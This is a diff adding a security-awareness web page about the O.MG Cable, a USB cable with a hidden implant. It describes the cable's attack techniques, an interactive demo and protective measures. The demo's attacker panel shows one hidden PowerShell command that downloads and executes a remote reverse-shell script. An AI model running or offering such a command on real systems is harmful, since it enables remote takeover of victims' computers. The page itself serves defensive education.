@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>O.MG Cable – SafeNet Security</title>
+    <meta name="description" content="What is an O.MG Cable? Learn how this cable, indistinguishable from a normal USB cable, gives attackers full remote access." />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="O.MG Cable – SafeNet Security" />
+    <meta property="og:description" content="What is an O.MG Cable? Learn how this cable, indistinguishable from a normal USB cable, gives attackers full remote access." />
+    <meta property="og:image" content="https://safenet-security.ch/images/SafeNet-Security-Logo/Withbg/ShieldWhiteName.png" />
+    <meta property="og:url" content="https://safenet-security.ch/en/pages/omg-cable.html" />
+    <link rel="canonical" href="https://safenet-security.ch/en/pages/omg-cable.html" />
+    <link rel="alternate" hreflang="de" href="https://safenet-security.ch/de/pages/omg-cable.html" />
+    <link rel="alternate" hreflang="en" href="https://safenet-security.ch/en/pages/omg-cable.html" />
+    <link rel="alternate" hreflang="x-default" href="https://safenet-security.ch/de/pages/omg-cable.html" />
+    <link rel="stylesheet" href="/css/navbar.css" />
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/shared.css" />
+    <link rel="stylesheet" href="/css/infobox.css" />
+    <link rel="stylesheet" href="/css/hero.css" />
+    <link rel="stylesheet" href="/css/footer.css" />
+    <link rel="stylesheet" href="/css/generator.css" />
+    <link rel="stylesheet" href="/css/omg-cable.css" />
+    <link rel="icon" type="image/png" href="/images/SafeNet-Security-Logo/Withoutbg/SafeNet Security 48 x 48 px.png" />
+    <script type="module" src="/js/auth.js?v=9"></script>
+  </head>
+  <body>
+    <div id="navbar"></div>
+
+    <h1>O.MG Cable</h1>
+
+    <section class="info-section">
+      <div class="info-box">
+        <h2>What is an O.MG Cable?</h2>
+        <p>
+          The O.MG Cable (developed by Mischief Gadgets / MG) is perhaps the most insidious attack tool in modern cybersecurity. It looks <strong>exactly like a normal USB charging cable</strong> – including original branding and connector design – but contains a miniaturized microcontroller and a Wi-Fi chip inside the USB plug. An attacker can control the cable remotely via their own Wi-Fi network and launch attacks at any time while the cable is connected to the computer.
+        </p>
+      </div>
+    </section>
+
+    <section class="info-section">
+      <div class="info-box">
+        <h2>Attack Techniques</h2>
+        <div class="hw-techniques">
+          <div class="hw-technique-card">
+            <div class="hw-technique-icon">📡</div>
+            <h4>Remote-Triggered Injection</h4>
+            <p>The attacker opens a web interface and sends commands to the cable – at any time, even hours after it was plugged in. The cable executes them as keystrokes.</p>
+          </div>
+          <div class="hw-technique-card">
+            <div class="hw-technique-icon">🕵️</div>
+            <h4>Time-Triggered Payloads</h4>
+            <p>Attacks can be time-scheduled – e.g. in the middle of the night when the computer was left unlocked.</p>
+          </div>
+          <div class="hw-technique-card">
+            <div class="hw-technique-icon">🔗</div>
+            <h4>Cable Swap Attack</h4>
+            <p>The cable is swapped with the victim's original cable. This "evil maid" attack is particularly insidious in hotels or at unattended workplaces.</p>
+          </div>
+          <div class="hw-technique-card">
+            <div class="hw-technique-icon">💊</div>
+            <h4>Reverse Shell</h4>
+            <p>A keystroke injection can open a reverse shell, giving the attacker persistent, interactive access – without any additional hardware.</p>
+          </div>
+          <div class="hw-technique-card">
+            <div class="hw-technique-icon">🔐</div>
+            <h4>Exfiltration Channel</h4>
+            <p>Files, passwords, or keys can be exfiltrated via the cable – the USB cable itself is the data channel.</p>
+          </div>
+          <div class="hw-technique-card">
+            <div class="hw-technique-icon">🎯</div>
+            <h4>Targeted Attacks</h4>
+            <p>The cable is ideal for targeted attacks on individuals: placed as a "gift" or deliberately left behind, the victim plugs it in themselves.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Demo -->
+    <div class="password-container">
+      <h3>Demo: Remote Payload Trigger</h3>
+      <p class="mfa-demo-intro">
+        The cable is plugged in – the victim thinks they're charging their device. The attacker opens the web interface and triggers the attack.
+      </p>
+
+      <!-- Cable scene -->
+      <div class="omg-cable-scene">
+        <div class="omg-scene-end">
+          <div class="omg-scene-icon">💻</div>
+          <div class="omg-scene-label">Victim Computer</div>
+          <div class="omg-scene-sub">nothing suspicious visible</div>
+        </div>
+        <div class="omg-cable-wire-wrap">
+          <div class="omg-cable-wire">
+            <div class="omg-cable-chip">O.MG</div>
+          </div>
+          <div class="omg-cable-note">looks like a normal USB cable</div>
+        </div>
+        <div class="omg-scene-end">
+          <div class="omg-scene-icon">🔌</div>
+          <div class="omg-scene-label">Charger / PC</div>
+          <span id="omg-cable-badge" class="omg-cable-badge charging">Charging (seemingly)</span>
+        </div>
+        <div class="omg-scene-remote">
+          <div id="omg-wifi-arc" class="omg-wifi-waves"><span>)</span><span>)</span><span>)</span></div>
+          <div class="omg-scene-icon">👨‍💻</div>
+          <div class="omg-scene-label">Attacker</div>
+          <div class="omg-scene-sub">remote via WiFi</div>
+        </div>
+      </div>
+
+      <!-- Attacker panel & terminal -->
+      <div class="omg-bottom-grid">
+        <div class="omg-attacker-box">
+          <h4>Attacker Panel (Remote)</h4>
+          <div class="omg-attacker-panel">
+            <div class="omg-attacker-label">⚠ O.MG Web Interface</div>
+            <div style="font-size:0.78rem;color:rgba(255,255,255,0.4);margin-bottom:8px;">Payload: Reverse Shell</div>
+            <div class="omg-cmd-display">powershell -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.99/shell.ps1')"</div>
+            <button id="omg-trigger-btn" class="omg-trigger-btn">▶ Trigger Payload</button>
+          </div>
+          <div id="omg-result" class="omg-result-banner"></div>
+        </div>
+
+        <div class="omg-terminal">
+          <div class="omg-terminal-bar">
+            <div class="omg-terminal-dot"></div>
+            <div class="omg-terminal-dot"></div>
+            <div class="omg-terminal-dot"></div>
+            <span class="omg-terminal-title">PowerShell – Victim Computer</span>
+          </div>
+          <div class="omg-terminal-body" id="omg-terminal-body">
+            <span class="omg-cursor"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="hw-demo-btns">
+        <button id="omg-reset-btn" class="main-btn">Reset Demo</button>
+      </div>
+    </div>
+
+    <script src="/js/omg-cable-en.js"></script>
+
+    <section class="info-section">
+      <div class="info-box">
+        <h2>What makes it especially dangerous?</h2>
+        <p>
+          <strong>Visually undetectable:</strong> The O.MG Cable passes visual inspection. Even experienced security professionals cannot distinguish it from a real cable without measurement equipment.<br /><br />
+          <strong>Patience:</strong> The attacker doesn't need to be present during the attack. The cable waits patiently for the optimal moment.<br /><br />
+          <strong>No suspicion:</strong> "My laptop is charging" – nobody thinks of an attack. The cable does nothing conspicuous until the attack is triggered.<br /><br />
+          <strong>Affordable and available:</strong> The cable costs approximately $150–200 USD and is publicly available.
+        </p>
+      </div>
+    </section>
+
+    <section class="info-section">
+      <div class="info-box">
+        <h2>How to protect yourself</h2>
+        <p>
+          <strong>1. Only use your own cables:</strong> Never use someone else's USB cable – even briefly for charging. Always carry your own cable.<br /><br />
+          <strong>2. Use USB data blockers:</strong> Special USB adapters (so-called "USB condoms") allow only power, no data communication – keystroke injection is impossible.<br /><br />
+          <strong>3. Disable USB ports:</strong> In high-security environments, unused USB ports can be locked down.<br /><br />
+          <strong>4. Never leave your computer unlocked:</strong> Even an O.MG Cable can't do anything if the computer is password-locked (BadUSB cannot bypass a lock screen).<br /><br />
+          <strong>5. Watch for unusual activity:</strong> Suddenly opening terminals or command prompts are a warning sign.
+        </p>
+      </div>
+    </section>
+
+    <div id="footer"></div>
+    <script src="/js/navbar-loader.js"></script>
+  </body>
+</html>
